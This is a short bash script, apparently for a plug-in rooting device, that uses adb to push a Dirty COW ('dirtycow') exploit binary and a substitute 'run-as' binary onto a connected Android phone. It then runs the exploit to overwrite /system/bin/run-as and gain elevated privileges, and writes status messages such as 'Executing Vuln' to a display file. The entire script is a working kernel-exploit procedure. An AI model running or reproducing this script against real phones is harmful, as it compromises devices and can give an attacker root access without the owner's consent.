#!/bin/bash

clear;
echo "USB device detected, initializing rooting procedure";
sleep 1;
clear;

ABI=$(/home/root/android-sdk-linux/platform-tools/adb shell getprop ro.product.cpu.abi)
echo $ABI
echo 'life after abi'
echo 'Device detected.,240,230,140' >> scroller.txt
sleep 1;

if [[ $ABI == armeabi* ]]; then
	echo 'v7a'
	FILE='/home/root/armeabi-v7a'
elif [ $ABI == 'armeabi' ]; then
	echo 'armeabi'
	FILE='/home/root/armeabi'
elif [[ $ABI == arm64* ]]; then
	echo 'arm64'
	FILE='/home/root/arm64-v8a'
# else; 
# 	echo 'Fatal runtime err,255,0,0' >> scroller.txt
# 	exit
fi

# python -c "import display.py; display.write('Pushing files',255,255,255)"

/home/root/android-sdk-linux/platform-tools/adb push $FILE/dirtycow /data/local/tmp/dirtycow
/home/root/android-sdk-linux/platform-tools/adb push $FILE/run-as /data/local/tmp/run-as

# python -c "import display.py; display.write('Executing vuln',255,255,255)"

#Execute vuln, start trying to overwhelm kernel
echo 'Executing Vuln,200,99,71' >> scroller.txt
/home/root/android-sdk-linux/platform-tools/adb shell 'chmod 777 /data/local/tmp/run-as';
/home/root/android-sdk-linux/platform-tools/adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as';
# python -c "import display.py; display.write('Testing run-as',255,255,255)"
/home/root/android-sdk-linux/platform-tools/adb shell /system/bin/run-as;

echo 'Sucess!,0,255,127' >> scroller.txt
clear;
echo "It seems to have worked... Maybe!";
sleep 10;
echo 'Please plug in!,255,192,203' >> scroller.txt
